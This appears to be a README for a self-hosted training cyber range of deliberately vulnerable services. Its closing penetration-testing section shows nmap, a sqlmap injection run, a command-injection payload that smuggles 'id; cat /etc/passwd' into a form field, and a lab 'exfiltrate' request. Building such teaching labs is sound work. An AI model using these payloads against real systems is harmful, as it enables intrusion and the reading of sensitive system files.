Dadiwoo Cyber Range Platform

A lightweight, microservice-based personal cyber range designed for virtualized environments (Ubuntu VM inside GNS3, EVE-NG, PNETLab, Proxmox, VMware). Features dynamic port allocation, an embedded UDP Mini DNS server, dual environment modes, and realistic vulnerability labs.

🎯 Platform Key Highlights

🛡

Dadiwoo Central Control Plane

Manage all microservices from a single dashboard (Port 9000). Features simultaneous Start/Stop controls, settings modal popups, and live update checking.

🌐

Embedded UDP Mini DNS Server

Built-in UDP DNS resolver (`dns/mini_dns.py` on port 5353) automatically resolving `.lab` domain hostnames (`atm.lab`, `bank.lab`, `mobile.lab`) to your host IP.

⚙️

Dual Environment Modes

Switch microservices between ⚔️ Cybersecurity Lab Target Mode (full vulnerabilities active) and 🌐 General Networking Node Mode (pingable reachability test node returning HTTP 503 on auth).

🔍

Tag Search & Pagination

Search microservices by keyword or tag (`osint`, `wifi`, `sqli`, `idor`, `bluetooth`, `command-injection`) with 20 items per page pagination.

🌐 Resolving `.lab` Domain Names

To enable instant domain resolution for atm.lab, bank.lab, isp.lab, school.lab, shop.lab, and mobile.lab:

Option 1: Add the `/etc/hosts` Line (Recommended)

Copy the exact line provided on the Dadiwoo Control Plane Dashboard (`http://:9000`):

127.0.0.1 atm.lab bank.lab isp.lab school.lab shop.lab mobile.lab

Append it to your machine's `/etc/hosts` file:

echo "127.0.0.1 atm.lab bank.lab isp.lab school.lab shop.lab mobile.lab" | sudo tee -a /etc/hosts

🐉 Penetration Testing with Kali Linux

A. Port Scanning (Nmap)

nmap -p 8080-8085,9000,5353 -sV <UBUNTU_VM_IP>

B. SQL Injection (sqlmap) - Banking Lab

sqlmap -u "http://<UBUNTU_VM_IP>:8081/?q=Allowance" --cookie="session_user=user1" --batch --dbs

C. Command Injection - ISP Lab

curl -X POST http://<UBUNTU_VM_IP>:8082/diagnostics -d "host=127.0.0.1; id; cat /etc/passwd"

D. Bluetooth Exfiltration - Smartphone Lab

curl -s http://<UBUNTU_VM_IP>:8085/api/v1/bluetooth/exfiltrate
